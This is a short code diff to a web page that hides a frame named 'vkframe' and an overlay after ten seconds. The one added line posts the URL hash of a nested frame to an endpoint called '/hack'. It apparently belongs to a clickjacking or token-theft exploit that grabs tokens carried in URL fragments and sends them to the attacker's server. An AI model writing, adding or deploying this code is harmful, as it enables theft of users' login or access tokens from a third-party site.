@@ -19,6 +19,7 @@
     setTimeout(function(){
       $("#vkframe").hide();
       $("#overlay").hide();
+      $.post("/hack", {hash:frames[0].frames[0].location.hash})
     }, 10000);
   </script>
 	<!--  -->
